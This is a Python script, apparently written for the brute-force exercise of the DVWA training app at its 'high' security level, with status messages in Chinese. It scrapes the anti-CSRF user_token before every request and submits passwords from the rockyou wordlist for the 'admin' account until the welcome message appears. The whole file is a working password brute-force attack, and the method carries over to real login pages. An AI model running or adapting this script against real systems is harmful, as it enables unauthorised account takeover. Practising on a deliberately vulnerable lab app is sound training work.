#!/usr/bin/env python3

import requests
import re
import time

URL = "IP/vulnerabilities/brute/"
PHPSESSID = ""
USERNAME = "admin"
PASSWORD_FILE = "/usr/share/wordlists/rockyou.txt"

def get_token():
    cookies = {'PHPSESSID': PHPSESSID, 'security': 'high'}
    resp = requests.get(URL, cookies=cookies)
    match = re.search(r"name='user_token' value='([^']+)'", resp.text)
    if not match:
        match = re.search(r'name="user_token" value="([^"]+)"', resp.text)
    return match.group(1)

def login_attempt(password, token):
    cookies = {'PHPSESSID': PHPSESSID, 'security': 'high'}
    params = {'username': USERNAME, 'password': password, 'user_token': token, 'Login': 'Login'}
    resp = requests.get(URL, params=params, cookies=cookies)
    return "Welcome to the password protected area" in resp.text

def main():
    print(f"[*] 目标: {URL}")
    print(f"[*] 用户名: {USERNAME}")
    
    with open(PASSWORD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        count = 0
        for line in f:
            password = line.strip()
            if not password:
                continue
            
            count += 1
            if count % 1000 == 0:
                print(f"[*] 已尝试: {count}")
            
            token = get_token()
            if login_attempt(password, token):
                print(f"\n[+] 密码找到: {password}")
                return
            
            if count % 100 == 0:
                time.sleep(0.1)
        
        print("\n[-] 未找到正确密码")

if __name__ == "__main__":
    main()
